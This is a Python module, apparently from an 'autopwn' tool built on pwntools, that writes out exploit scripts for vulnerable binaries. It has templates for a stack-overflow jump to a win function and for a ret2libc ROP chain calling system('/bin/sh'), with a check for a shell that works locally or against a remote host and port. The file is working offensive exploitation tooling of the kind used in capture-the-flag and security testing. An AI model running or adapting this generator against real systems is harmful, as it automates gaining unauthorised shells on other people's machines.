from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING, Any

from pwn import log

if TYPE_CHECKING:
    from autopwn.context import PwnContext


def generate_exploit_script(ctx: PwnContext, exploit_steps: list[dict[str, Any]]) -> str:
    lines: list[str] = []

    def emit(line: str = "") -> None:
        lines.append(line)

    emit("#!/usr/bin/env python3")
    emit("from pwn import *")
    emit("")
    emit(f"binary_path = {ctx.binary_path!r}")
    emit(f"elf = ELF(binary_path)")

    if ctx.libc and ctx.libc.path:
        emit(f"libc = ELF({ctx.libc.path!r})")
    elif ctx.libc_base:
        emit("libc = None")
    else:
        emit("libc = elf.libc")

    emit("")
    emit(f"context.binary = elf")
    emit(f"context.arch = {ctx.arch!r}")
    emit(f"context.bits = {ctx.bits}")
    emit("")

    emit("def connect(remote_addr=None):")
    emit("    if remote_addr:")
    emit("        host, port = remote_addr.split(':')")
    emit("        return remote(host, int(port))")
    emit("    return process(binary_path)")
    emit("")

    emit("def exploit(p):")

    if not exploit_steps:
        emit("    # No exploit steps recorded -- manual exploit below")
        _emit_fallback_exploit(ctx, emit)
    else:
        for step in exploit_steps:
            action = step.get("action", "")
            comment = step.get("comment", "")
            code = step.get("code", "")
            if comment:
                emit(f"    # {comment}")
            if code:
                for code_line in code.splitlines():
                    emit(f"    {code_line}")
            elif action == "send_payload":
                payload_expr = step.get("payload", "b'A'")
                emit(f"    p.send({payload_expr})")
            elif action == "sendline":
                data_expr = step.get("data", "b''")
                emit(f"    p.sendline({data_expr})")
            elif action == "recv_leak":
                var = step.get("var", "leak")
                emit(f"    {var} = u64(p.recv(6).ljust(8, b'\\x00'))")
                emit(f"    log.info(f'{var} = {{{var}:#x}}')")
            elif action == "interactive":
                emit("    p.interactive()")
            elif action == "verify_shell":
                emit("    p.sendline(b'echo P_W_N_E_D')")
                emit("    resp = p.recvuntil(b'P_W_N_E_D', timeout=3)")
                emit("    if b'P_W_N_E_D' in resp:")
                emit("        log.success('Shell obtained!')")
                emit("        p.interactive()")
                emit("    else:")
                emit("        log.failure('Shell verification failed')")
            else:
                emit(f"    # action: {action}")
                for k, v in step.items():
                    if k not in ("action", "comment"):
                        emit(f"    # {k} = {v!r}")
        emit("")

    emit("")
    emit("if __name__ == '__main__':")
    emit("    import sys")
    emit("    remote_addr = None")
    emit("    for i, arg in enumerate(sys.argv):")
    emit("        if arg in ('-r', '--remote') and i + 1 < len(sys.argv):")
    emit("            remote_addr = sys.argv[i + 1]")
    emit("    p = connect(remote_addr)")
    emit("    exploit(p)")
    emit("")

    return "\n".join(lines)


def _emit_fallback_exploit(ctx: PwnContext, emit) -> None:
    if ctx.overflow_offset >= 0 and ctx.win_funcs:
        wf = ctx.win_funcs[0]
        addr = wf.get("addr", wf) if isinstance(wf, dict) else getattr(wf, "addr", wf)
        emit(f"    offset = {ctx.overflow_offset}")
        emit(f"    win_addr = {addr:#x}")
        if ctx.bits == 64:
            ret_gadget = ctx.find_gadget("ret")
            if ret_gadget:
                emit(f"    ret = {ret_gadget:#x}")
                emit("    payload = flat(b'A' * offset, ret, win_addr)")
            else:
                emit("    payload = flat(b'A' * offset, win_addr)")
        else:
            emit("    payload = flat(b'A' * offset, win_addr)")
        emit("    p.send(payload)")
        emit("    p.interactive()")
    elif ctx.overflow_offset >= 0 and ctx.libc_base:
        emit(f"    offset = {ctx.overflow_offset}")
        emit(f"    libc_base = {ctx.libc_base:#x}")
        emit("    system = libc_base + libc.symbols['system']")
        emit("    bin_sh = libc_base + next(libc.search(b'/bin/sh'))")
        pop_rdi = ctx.find_gadget("pop rdi")
        if pop_rdi and ctx.bits == 64:
            emit(f"    pop_rdi = {pop_rdi:#x}")
            ret = ctx.find_gadget("ret")
            if ret:
                emit(f"    ret = {ret:#x}")
                emit("    payload = flat(b'A' * offset, ret, pop_rdi, bin_sh, system)")
            else:
                emit("    payload = flat(b'A' * offset, pop_rdi, bin_sh, system)")
        else:
            emit("    payload = flat(b'A' * offset, system, b'JUNK', bin_sh)")
        emit("    p.send(payload)")
        emit("    p.interactive()")
    else:
        emit("    # TODO: fill in exploit logic")
        emit("    p.interactive()")


def save_exploit_script(ctx: PwnContext, path: str | None = None, exploit_steps: list[dict[str, Any]] | None = None) -> str:
    if exploit_steps is None:
        exploit_steps = []
    script = generate_exploit_script(ctx, exploit_steps)
    if path is None:
        binary_name = Path(ctx.binary_path).stem
        path = f"exploit_{binary_name}.py"
    out = Path(path)
    out.write_text(script)
    out.chmod(0o755)
    log.success(f"Exploit script saved to {out.resolve()}")
    return str(out.resolve())
